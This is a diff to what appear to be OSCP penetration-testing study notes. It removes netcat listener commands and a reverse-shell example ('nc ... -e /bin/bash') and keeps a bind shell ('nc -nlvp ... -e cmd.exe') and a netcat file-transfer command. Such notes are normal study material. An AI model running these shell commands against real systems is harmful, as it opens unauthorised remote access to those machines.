@@ -13,14 +13,6 @@
 	https://www.sneakymonkey.net/2021/04/15/oscp-2020-tips/
 	
 # Netcat
-<b>Interact with application:</b>
-
-	nc -nv <[IP]> <[PORT]>
-
-<b>Listener:</b>
-
-	nc -nlvp <[PORT]>
-
 <b>File transfer (client):</b>
 
 	nc -nlvp <[PORT]> > <[FILE]>
@@ -40,14 +32,6 @@ Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:
 	(BOB): nc -nlvp <[PORT]> -e cmd.exe
 
 	(ALICE): nc -nv <[BOB_IP]> <[PORT]>
-
-<b>Reverse Shell:</b>
-
-Alice needs Bob's help. Since  Alice is beyond firewall it is impossible to BOB to reach Alice. So Alice create a reverse shell:
-
-	(ALICE): nc -nv <[BOB_IP]> <[PORT]> -e /bin/bash
-
-	(BOB): nc -nlvp <[PORT]>
 
 # Zone Transfer
 
